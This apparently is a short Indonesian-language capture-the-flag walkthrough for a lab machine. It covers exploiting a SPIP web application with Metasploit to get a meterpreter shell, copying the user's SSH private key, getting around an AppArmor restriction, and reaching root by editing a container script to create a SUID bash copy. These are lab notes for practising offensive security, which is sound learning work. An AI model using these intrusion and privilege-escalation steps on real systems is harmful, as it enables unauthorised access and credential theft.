1. scan 80 22 buka -> fuzz gada -> coba cek /spip soalnya webnya ada spip spip
2. cek source code ada versi spipnya -> searchsploit atau lgsg di msfconsole -> gas aja
3. msfconsole -> targeturi itu path spip nya /spip jadi -> rhost ip target -> lhost ip vpn -> run
4. dapet meterpreter -> shell aja atau meterpreter -> di /home/user bisa cat flag -> ke .ssh copy id_rsa -> chmod 600 ssh
5. find / -type f -perm -u=s 2>/dev/null -> cek run container -> jalanin -> ada error di opt -> kesana coba
6. ps -p $$ -> ada ash -> coba find / -name *ash 2>/dev/null
7. ada di apparmor cek coba -> ada di hint juga -> cat baca yg di deny dan writeable
8. cp /bin/bash /dev/shm -> cd kesitu -> /dev/shm/bash -p -> ls -l /opt udah bisa 
9. nano /opt/run_container.sh tuh -> shebang, cp /bin/bash /tmp/bash, chmod +s /tmp/bash
10. ke /opt -> ls -> run aja container nya ->  ls /tmp -> /tmp/bash -p  -> klaim root
